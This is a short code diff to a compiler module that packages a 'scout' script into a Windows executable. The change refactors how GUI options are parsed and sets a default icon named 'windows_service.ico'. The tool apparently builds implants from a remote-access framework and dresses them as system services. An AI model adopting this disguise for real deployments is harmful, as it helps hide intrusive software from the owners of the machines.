@@ -11,8 +11,6 @@ if interface == "GUI":
 
 
 def main(path, prompt = None):
-    if interface == "GUI":
-        command = prompt.split(" ")
     if os.name == 'nt':
         filename = ntpath.basename(path)[:-3] + '.exe'
     else:
@@ -23,18 +21,21 @@ def main(path, prompt = None):
         print(config.inf + 'Initiating compilation of scout : ' + path)
     tags = []
     if interface == "GUI":
-        if command[1] == "1":
+        if prompt['onefile']:
             tags.append("--onefile")
-        if command[2] == "0":
+        if prompt['windowed']:
             tags.append('--windowed')
-        if command[3] == "1":
-            if os.path.exists(command[4]):
+        if prompt['custom_icon']:
+            if os.path.exists(prompt['custom_icon_filepath']):
                 config.app.logger.info("[library/modules/compiler] - Custom .ico file found and loaded")
-                tags.append('--icon ' + command[4])
+                tags.append('--icon ' + prompt['custom_icon_filepath'])
             else:
                 config.app.logger.warning("[library/modules/compiler] - Custom .ico file not found")
                 tags.append('--icon ' + os.path.join(os.getcwd(), 'resources', 'windows_service.ico'))
                 config.app.logger.info("[library/modules/compiler] - Default .ico file used")
+        else:
+            tags.append('--icon ' + os.path.join(os.getcwd(), 'resources', 'windows_service.ico'))
+            config.app.logger.info("[library/modules/compiler] - Default .ico file used")
     elif interface == "CUI":
         while True:
             option = input(config.pro + 'Compress compiled scout into one file? [y|n] : ')
